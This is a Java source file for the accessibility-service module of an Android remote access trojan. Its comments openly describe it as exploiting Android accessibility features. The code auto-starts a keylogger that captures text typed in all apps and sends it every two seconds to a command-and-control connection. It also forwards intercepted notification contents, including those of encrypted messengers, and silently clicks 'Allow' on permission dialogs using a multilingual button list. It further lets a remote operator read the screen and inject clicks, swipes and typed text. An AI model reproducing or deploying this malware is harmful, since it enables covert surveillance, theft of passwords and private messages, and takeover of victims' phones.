package com.egnakerat.system;

import android.accessibilityservice.AccessibilityService;
import android.accessibilityservice.AccessibilityServiceInfo;
import android.accessibilityservice.GestureDescription;
import android.app.Notification;
import android.content.Intent;
import android.graphics.Path;
import android.os.Build;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.accessibility.AccessibilityEvent;
import android.view.accessibility.AccessibilityNodeInfo;

import org.json.JSONArray;
import org.json.JSONObject;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.HashSet;
import java.util.List;
import java.util.Set;

/**
 * RATAccessibilityService v1.0
 * 
 * Exploits Android Accessibility Service for:
 * - Keylogging (captures all text input across apps)
 * - Screen text reading (traverses UI tree)
 * - Notification interception (reads all notifications including E2E encrypted messengers)
 * - Auto-permission granting (clicks "Allow" on permission dialogs)
 * - Remote UI actions (click, scroll, back, home, swipe)
 */
public class RATAccessibilityService extends AccessibilityService {

    private static final String TAG = "RATAccessibility";

    // Singleton instance
    private static RATAccessibilityService instance = null;

    // Keylogger state
    private volatile boolean keyloggerActive = false;
    private final StringBuilder keylogBuffer = new StringBuilder();
    private String currentApp = "";
    private long lastKeylogSend = 0;
    private static final long KEYLOG_SEND_INTERVAL = 2000; // 2 seconds buffer

    // Auto-permission granting
    private volatile boolean autoGrantPermissions = true;

    // Permission dialog button texts (multi-language)
    private static final Set<String> ALLOW_BUTTONS = new HashSet<>(Arrays.asList(
            // English
            "allow", "allow all", "while using the app", "only this time",
            "allow all the time", "permit", "accept", "ok", "yes", "continue",
            "grant", "agree", "confirm", "enable", "turn on", "got it",
            // Turkish
            "iÌ‡zin ver", "izin ver", "kabul et", "evet", "tamam", "devam",
            "onayla", "etkinleÅŸtir", "aÃ§", "her zaman izin ver",
            "uygulama kullanÄ±lÄ±rken", "yalnÄ±zca bu kez",
            // German
            "zulassen", "erlauben", "akzeptieren", "ja",
            // French
            "autoriser", "accepter", "oui", "permettre",
            // Spanish
            "permitir", "aceptar", "sÃ­",
            // Russian
            "Ñ€Ğ°Ğ·Ñ€ĞµÑˆĞ¸Ñ‚ÑŒ", "Ğ¿Ñ€Ğ¸Ğ½ÑÑ‚ÑŒ", "Ğ´Ğ°",
            // Arabic
            "Ø³Ù…Ø§Ø­", "Ù‚Ø¨ÙˆÙ„", "Ù†Ø¹Ù…"
    ));

    // Handler for periodic keylog flushing
    private final Handler handler = new Handler(Looper.getMainLooper());
    private final Runnable keylogFlusher = new Runnable() {
        @Override
        public void run() {
            flushKeylogBuffer();
            if (keyloggerActive) {
                handler.postDelayed(this, KEYLOG_SEND_INTERVAL);
            }
        }
    };

    @Override
    public void onServiceConnected() {
        super.onServiceConnected();
        instance = this;
        Log.d(TAG, "Accessibility Service connected");

        // Configure the service
        AccessibilityServiceInfo info = getServiceInfo();
        if (info != null) {
            info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
            info.feedbackType = AccessibilityServiceInfo.FEEDBACK_GENERIC;
            info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
                    | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
                    | AccessibilityServiceInfo.FLAG_REQUEST_TOUCH_EXPLORATION_MODE;
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                info.flags |= AccessibilityServiceInfo.FLAG_REQUEST_FILTER_KEY_EVENTS;
            }
            info.notificationTimeout = 100;
            setServiceInfo(info);
        }

        // Auto-start keylogger
        startKeylogger();
    }

    @Override
    public void onAccessibilityEvent(AccessibilityEvent event) {
        if (event == null) return;

        try {
            int eventType = event.getEventType();

            switch (eventType) {
                case AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED:
                    handleTextChanged(event);
                    break;

                case AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED:
                    handleWindowStateChanged(event);
                    break;

                case AccessibilityEvent.TYPE_WINDOW_CONTENT_CHANGED:
                    // Could be used for screen reading
                    break;

                case AccessibilityEvent.TYPE_NOTIFICATION_STATE_CHANGED:
                    handleNotification(event);
                    break;

                case AccessibilityEvent.TYPE_VIEW_CLICKED:
                    // Track clicks for context
                    break;

                case AccessibilityEvent.TYPE_VIEW_FOCUSED:
                    handleViewFocused(event);
                    break;
            }
        } catch (Exception e) {
            Log.e(TAG, "Event handling error: " + e.getMessage());
        }
    }

    @Override
    public void onInterrupt() {
        Log.w(TAG, "Accessibility Service interrupted");
    }

    @Override
    public void onDestroy() {
        instance = null;
        keyloggerActive = false;
        handler.removeCallbacks(keylogFlusher);
        super.onDestroy();
    }

    // / Keylogger

    private void handleTextChanged(AccessibilityEvent event) {
        if (!keyloggerActive) return;

        try {
            CharSequence text = event.getText() != null && !event.getText().isEmpty()
                    ? event.getText().get(0) : null;
            if (text == null || text.length() == 0) return;

            String packageName = event.getPackageName() != null
                    ? event.getPackageName().toString() : "unknown";

            // Track app changes
            if (!packageName.equals(currentApp)) {
                currentApp = packageName;
                synchronized (keylogBuffer) {
                    keylogBuffer.append("\n[APP: ").append(packageName).append("]\n");
                }
            }

            synchronized (keylogBuffer) {
                keylogBuffer.append(text.toString());
            }

        } catch (Exception e) {
            Log.e(TAG, "Keylog text error: " + e.getMessage());
        }
    }

    private void handleViewFocused(AccessibilityEvent event) {
        if (!keyloggerActive) return;

        try {
            String packageName = event.getPackageName() != null
                    ? event.getPackageName().toString() : "unknown";
            if (!packageName.equals(currentApp)) {
                currentApp = packageName;
                synchronized (keylogBuffer) {
                    keylogBuffer.append("\n[APP: ").append(packageName).append("]\n");
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Focus tracking error: " + e.getMessage());
        }
    }

    private void flushKeylogBuffer() {
        String data;
        synchronized (keylogBuffer) {
            if (keylogBuffer.length() == 0) return;
            data = keylogBuffer.toString();
            keylogBuffer.setLength(0);
        }

        // Send to C2 via ConnectionManager
        ConnectionManager conn = RATService.activeConnection;
        if (conn != null && conn.isConnected()) {
            conn.sendKeylogData(currentApp, data);
        }
    }

    public void startKeylogger() {
        keyloggerActive = true;
        handler.postDelayed(keylogFlusher, KEYLOG_SEND_INTERVAL);
        Log.d(TAG, "Keylogger started");
    }

    public void stopKeylogger() {
        keyloggerActive = false;
        handler.removeCallbacks(keylogFlusher);
        flushKeylogBuffer(); // Send remaining data
        Log.d(TAG, "Keylogger stopped");
    }

    public boolean isKeyloggerActive() {
        return keyloggerActive;
    }

    // / Notification Interception

    private void handleNotification(AccessibilityEvent event) {
        try {
            if (event.getParcelableData() instanceof Notification) {
                Notification notification = (Notification) event.getParcelableData();
                String packageName = event.getPackageName() != null
                        ? event.getPackageName().toString() : "unknown";

                Bundle extras = notification.extras;
                String title = extras != null && extras.getCharSequence(Notification.EXTRA_TITLE) != null
                        ? extras.getCharSequence(Notification.EXTRA_TITLE).toString() : "";
                String text = extras != null && extras.getCharSequence(Notification.EXTRA_TEXT) != null
                        ? extras.getCharSequence(Notification.EXTRA_TEXT).toString() : "";
                String bigText = extras != null && extras.getCharSequence(Notification.EXTRA_BIG_TEXT) != null
                        ? extras.getCharSequence(Notification.EXTRA_BIG_TEXT).toString() : "";

                if (!text.isEmpty() || !title.isEmpty()) {
                    String content = bigText.isEmpty() ? text : bigText;

                    ConnectionManager conn = RATService.activeConnection;
                    if (conn != null && conn.isConnected()) {
                        conn.sendNotification(packageName, title, content);
                    }
                }
            } else {
                // Fallback: extract text from event
                List<CharSequence> texts = event.getText();
                if (texts != null && !texts.isEmpty()) {
                    String packageName = event.getPackageName() != null
                            ? event.getPackageName().toString() : "unknown";
                    StringBuilder sb = new StringBuilder();
                    for (CharSequence t : texts) {
                        if (t != null) sb.append(t.toString()).append(" ");
                    }
                    String content = sb.toString().trim();
                    if (!content.isEmpty()) {
                        ConnectionManager conn = RATService.activeConnection;
                        if (conn != null && conn.isConnected()) {
                            conn.sendNotification(packageName, "", content);
                        }
                    }
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Notification intercept error: " + e.getMessage());
        }
    }

    // / Auto Permission Granting

    private void handleWindowStateChanged(AccessibilityEvent event) {
        if (!autoGrantPermissions) return;

        try {
            // Check if this is a permission dialog
            String packageName = event.getPackageName() != null
                    ? event.getPackageName().toString() : "";

            // Android permission dialogs come from these packages
            if (packageName.equals("com.android.packageinstaller")
                    || packageName.equals("com.google.android.packageinstaller")
                    || packageName.equals("com.android.permissioncontroller")
                    || packageName.equals("com.samsung.android.permissioncontroller")
                    || packageName.equals("com.android.systemui")
                    || packageName.contains("permissioncontroller")) {

                AccessibilityNodeInfo root = getRootInActiveWindow();
                if (root != null) {
                    clickAllowButton(root);
                    root.recycle();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Auto-grant error: " + e.getMessage());
        }
    }

    private boolean clickAllowButton(AccessibilityNodeInfo node) {
        if (node == null) return false;

        try {
            // Check if this node is a clickable button with "Allow" text
            if (node.isClickable()) {
                String text = node.getText() != null
                        ? node.getText().toString().toLowerCase().trim() : "";
                String desc = node.getContentDescription() != null
                        ? node.getContentDescription().toString().toLowerCase().trim() : "";

                if (ALLOW_BUTTONS.contains(text) || ALLOW_BUTTONS.contains(desc)) {
                    node.performAction(AccessibilityNodeInfo.ACTION_CLICK);
                    Log.d(TAG, "Auto-clicked permission button: " + text);
                    return true;
                }
            }

            // Recursively check children
            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    if (clickAllowButton(child)) {
                        child.recycle();
                        return true;
                    }
                    child.recycle();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Click allow error: " + e.getMessage());
        }

        return false;
    }

    // / Screen Text Reader

    public JSONObject readScreenContent() {
        JSONObject result = new JSONObject();
        try {
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) {
                result.put("error", "No active window");
                return result;
            }

            String packageName = root.getPackageName() != null
                    ? root.getPackageName().toString() : "unknown";
            result.put("package", packageName);

            JSONArray textNodes = new JSONArray();
            extractTextNodes(root, textNodes, 0);
            result.put("texts", textNodes);
            result.put("count", textNodes.length());

            root.recycle();
        } catch (Exception e) {
            try {
                result.put("error", e.getMessage());
            } catch (Exception ignored) {}
        }
        return result;
    }

    private void extractTextNodes(AccessibilityNodeInfo node, JSONArray texts, int depth) {
        if (node == null || depth > 30) return; // Prevent infinite recursion

        try {
            String text = node.getText() != null ? node.getText().toString() : null;
            String desc = node.getContentDescription() != null
                    ? node.getContentDescription().toString() : null;
            String viewId = node.getViewIdResourceName() != null
                    ? node.getViewIdResourceName() : "";

            if (text != null && !text.trim().isEmpty()) {
                JSONObject textNode = new JSONObject();
                textNode.put("text", text);
                textNode.put("class", node.getClassName() != null ? node.getClassName().toString() : "");
                textNode.put("id", viewId);
                if (desc != null) textNode.put("description", desc);
                texts.put(textNode);
            } else if (desc != null && !desc.trim().isEmpty()) {
                JSONObject textNode = new JSONObject();
                textNode.put("description", desc);
                textNode.put("class", node.getClassName() != null ? node.getClassName().toString() : "");
                textNode.put("id", viewId);
                texts.put(textNode);
            }

            for (int i = 0; i < node.getChildCount(); i++) {
                AccessibilityNodeInfo child = node.getChild(i);
                if (child != null) {
                    extractTextNodes(child, texts, depth + 1);
                    child.recycle();
                }
            }
        } catch (Exception e) {
            Log.e(TAG, "Extract text error: " + e.getMessage());
        }
    }

    // / Remote Ui Actions

    public boolean performRemoteAction(String action, JSONObject params) {
        try {
            switch (action) {
                case "back":
                    return performGlobalAction(GLOBAL_ACTION_BACK);
                case "home":
                    return performGlobalAction(GLOBAL_ACTION_HOME);
                case "recents":
                    return performGlobalAction(GLOBAL_ACTION_RECENTS);
                case "notifications":
                    return performGlobalAction(GLOBAL_ACTION_NOTIFICATIONS);
                case "quickSettings":
                    return performGlobalAction(GLOBAL_ACTION_QUICK_SETTINGS);
                case "powerDialog":
                    return performGlobalAction(GLOBAL_ACTION_POWER_DIALOG);
                case "lockScreen":
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        return performGlobalAction(GLOBAL_ACTION_LOCK_SCREEN);
                    }
                    return false;
                case "screenshot":
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                        return performGlobalAction(GLOBAL_ACTION_TAKE_SCREENSHOT);
                    }
                    return false;
                case "click":
                    return performClickAction(params);
                case "swipe":
                    return performSwipeAction(params);
                case "scroll":
                    return performScrollAction(params);
                case "typeText":
                    return performTypeText(params);
                default:
                    Log.w(TAG, "Unknown action: " + action);
                    return false;
            }
        } catch (Exception e) {
            Log.e(TAG, "Remote action error: " + e.getMessage());
            return false;
        }
    }

    private boolean performClickAction(JSONObject params) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        try {
            int x = params.optInt("x", 540);
            int y = params.optInt("y", 960);

            Path clickPath = new Path();
            clickPath.moveTo(x, y);

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(clickPath, 0, 50));
            return dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            Log.e(TAG, "Click action error: " + e.getMessage());
            return false;
        }
    }

    private boolean performSwipeAction(JSONObject params) {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.N) return false;
        try {
            int x1 = params.optInt("x1", 540);
            int y1 = params.optInt("y1", 1200);
            int x2 = params.optInt("x2", 540);
            int y2 = params.optInt("y2", 400);
            int duration = params.optInt("duration", 300);

            Path swipePath = new Path();
            swipePath.moveTo(x1, y1);
            swipePath.lineTo(x2, y2);

            GestureDescription.Builder builder = new GestureDescription.Builder();
            builder.addStroke(new GestureDescription.StrokeDescription(swipePath, 0, duration));
            return dispatchGesture(builder.build(), null, null);
        } catch (Exception e) {
            Log.e(TAG, "Swipe action error: " + e.getMessage());
            return false;
        }
    }

    private boolean performScrollAction(JSONObject params) {
        try {
            String direction = params.optString("direction", "down");
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;

            AccessibilityNodeInfo scrollable = findScrollable(root);
            if (scrollable != null) {
                boolean result;
                if ("up".equals(direction)) {
                    result = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_BACKWARD);
                } else {
                    result = scrollable.performAction(AccessibilityNodeInfo.ACTION_SCROLL_FORWARD);
                }
                scrollable.recycle();
                root.recycle();
                return result;
            }
            root.recycle();
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Scroll action error: " + e.getMessage());
            return false;
        }
    }

    private AccessibilityNodeInfo findScrollable(AccessibilityNodeInfo node) {
        if (node == null) return null;
        if (node.isScrollable()) return node;
        for (int i = 0; i < node.getChildCount(); i++) {
            AccessibilityNodeInfo child = node.getChild(i);
            if (child != null) {
                AccessibilityNodeInfo result = findScrollable(child);
                if (result != null) return result;
                child.recycle();
            }
        }
        return null;
    }

    private boolean performTypeText(JSONObject params) {
        try {
            String text = params.optString("text", "");
            AccessibilityNodeInfo root = getRootInActiveWindow();
            if (root == null) return false;

            AccessibilityNodeInfo focused = root.findFocus(AccessibilityNodeInfo.FOCUS_INPUT);
            if (focused != null) {
                Bundle args = new Bundle();
                args.putCharSequence(AccessibilityNodeInfo.ACTION_ARGUMENT_SET_TEXT_CHARSEQUENCE, text);
                boolean result = focused.performAction(AccessibilityNodeInfo.ACTION_SET_TEXT, args);
                focused.recycle();
                root.recycle();
                return result;
            }
            root.recycle();
            return false;
        } catch (Exception e) {
            Log.e(TAG, "Type text error: " + e.getMessage());
            return false;
        }
    }

    // / Auto Permission Control

    public void setAutoGrantPermissions(boolean enabled) {
        this.autoGrantPermissions = enabled;
    }

    public boolean isAutoGrantEnabled() {
        return autoGrantPermissions;
    }

    // / Static Access

    public static RATAccessibilityService getInstance() {
        return instance;
    }

    public static boolean isServiceActive() {
        return instance != null;
    }
}
